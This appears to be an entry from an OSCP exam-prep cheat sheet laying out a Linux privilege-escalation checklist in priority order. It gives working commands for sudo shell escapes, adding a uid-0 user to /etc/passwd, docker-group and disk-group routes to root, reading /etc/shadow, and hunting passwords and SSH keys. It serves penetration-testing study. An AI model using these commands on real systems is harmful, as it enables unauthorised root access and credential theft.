title: Linux Privesc — Ordered Checklist (what to check FIRST)
body: Structured Linux privilege escalation in the order that finds the win fastest on OSCP boxes. Run each step before going to the next — most boxes fall at step 1 or 2 (sudo or SUID), and kernel exploits (step 9) should be the absolute last resort because they can crash the box. The pattern every time: one command, see something interesting, go to the deep node, exploit it. Do not reach for linpeas before the 30-second manual checks — sudo -l alone wins more boxes than most people think.
cmd:
# ══ ⭐ ORIENT — 30 seconds, ALWAYS first ══════════════════════════════
id                        # uid/gid + groups — the single most useful line
whoami
uname -a                  # kernel version (save for step 7)
cat /etc/os-release       # distro + version
hostname
ip a                      # interfaces — are you in a container / dual-NIC?
env | grep -iE 'path|shell|sudo|proxy'

# >> SHELL TYPE — check or everything below can mislead you <<
# PTY (python pty / socat / evil-winrm)  -> full job control, works normally
# dumb shell (nc, curl)                  -> no tab, CTRL+C kills the shell
#   fix: python3 -c 'import pty;pty.spawn("/bin/bash")'
#         then Ctrl+Z, stty raw -echo; fg, reset

# ══════════════════════════════════════════════════════
# 1. SUDO  — check FIRST, most common OSCP win
# ══════════════════════════════════════════════════════
sudo -l                   # no password sudo on ANY binary = instant root
# (ALL : ALL) ALL          -> sudo -i / sudo su
# NOPASSWD: /usr/bin/vim   -> sudo vim -c ':!/bin/bash'
# Anything on this list?   -> GTFOBins sudo filter: gtfobins.github.io
# Full sudo exploitation and GTFOBins one-liners -> sudo_check

# ══════════════════════════════════════════════════════
# 2. SUID / SGID + CAPABILITIES  — second check
# ══════════════════════════════════════════════════════
find / -perm -u=s -type f 2>/dev/null    # SUID binaries
getcap -r / 2>/dev/null                  # capabilities (cap_setuid = game over)
# Common wins: cp, find, vim, python, perl, node, nmap (GTFOBins SUID filter)
# Full exploitation + GTFOBins one-liners -> suid_check

# ══════════════════════════════════════════════════════
# 3. CRON JOBS  — writable scripts root runs on a schedule
# ══════════════════════════════════════════════════════
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null
# spot root-owned crons calling scripts in writable locations
# run pspy64 to catch crons that don't show in crontab:
./pspy64 2>/dev/null | grep -iE "CMD|UID=0"    # watch ~60-90s
# Full pspy workflow + script injection -> cron_check

# ══════════════════════════════════════════════════════
# 4. CREDENTIAL HUNT  — config files, history, backups
# ══════════════════════════════════════════════════════
cat ~/.bash_history
find / -name "*.conf" -o -name "*.config" -o -name "*.xml" 2>/dev/null \
  | xargs grep -liE "password|passwd|secret|credential" 2>/dev/null | head -20
find / -name "id_rsa" -o -name "*.key" 2>/dev/null   # SSH private keys
ls -la /var/backups/ /opt/ /srv/ /tmp/ /var/tmp/      # non-standard dirs
grep -riE "password\s*=" /var/www/ 2>/dev/null | head -15   # web configs
# Full hunt + DB creds + reuse -> linux_password_hunt

# ══════════════════════════════════════════════════════
# 5. WRITABLE SERVICES / FILES  — own something root runs
# ══════════════════════════════════════════════════════
# writable systemd units:
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -type f 2>/dev/null
# writable PATH binaries (root's PATH, not yours):
echo $PATH; find /usr/local/bin /usr/local/sbin -writable 2>/dev/null
# world-writable files owned by root:
find / -writable -user root -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20
# Full systemd hijack + PATH injection -> writable_service
# PATH injection + docker/lxd groups -> linux_privesc_extra

# ══════════════════════════════════════════════════════
# 6. /etc/passwd + /etc/shadow  — if writable → instant root
# ══════════════════════════════════════════════════════
ls -la /etc/passwd /etc/shadow
# world-writable passwd = add a root user:
openssl passwd newpass   # get hash
echo "r00t:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su r00t
# Full /etc/passwd + shadow crack methods -> passwd_shadow

# ══════════════════════════════════════════════════════
# 7. LINPEAS  — automation (run after manual; confirms + finds less-obvious)
# ══════════════════════════════════════════════════════
./linpeas.sh 2>/dev/null | tee /tmp/lp.out
grep -E "95%|99%|\[!\]" /tmp/lp.out   # pull the highest-confidence hits only
# RED = critical, YELLOW = interesting. Each hit needs manual confirmation.
# Transfer and run -> linpeas

# ══════════════════════════════════════════════════════
# 8. CAPABILITIES + NFS + INTERESTING GROUPS
# ══════════════════════════════════════════════════════
cat /etc/exports                        # NFS — no_root_squash = SUID trick
id; groups                              # docker/lxd/disk/adm/shadow group?
# docker group = root:  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# disk group = raw device read:  debugfs /dev/sda1  → read /etc/shadow
# shadow group: cat /etc/shadow
# NFS + docker/lxd details -> linux_manual_enum + linux_privesc_extra

# ══════════════════════════════════════════════════════
# 9. KERNEL EXPLOIT  — last resort, crashing risk
# ══════════════════════════════════════════════════════
uname -r                               # kernel version
cat /proc/version
# search: searchsploit linux kernel <version> | grep local
# Use ONLY if steps 1-8 found nothing. Kernel exploits can crash the box.
# Full searchsploit + DirtyPipe/PwnKit/etc -> kernel_exploit

# ── QUICK RECON WHEN STUCK ────────────────────────────
# "I ran everything and found nothing" — these are what people miss:
find / -perm -o=w -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v ".pyc"  # world-writable
ps aux | grep -v "^root\|grep"                 # running processes as other users
ss -tlnp; netstat -tlnp 2>/dev/null           # internal services (port forward target?)
ls -laR /home/*/ 2>/dev/null                  # other users' home dirs you can read
find / -name "*.sh" -writable 2>/dev/null     # writable shell scripts
cat /etc/hosts; arp -a                        # other hosts in the network
warn: ORDER MATTERS: most OSCP Linux boxes fall at step 1 (sudo -l) or step 2 (SUID). Run manual checks first, not linpeas first. Kernel exploits crash boxes — only use if steps 1-8 found nothing. pspy64 for crons needs 60-90 seconds of runtime. World-writable /etc/passwd = game over in one command. Still stuck after all 9 steps? Check internal services (ss -tlnp) and other users home dirs — the vector is often lateral, not vertical.

choices.label: 7. Run linpeas and triage RED hits
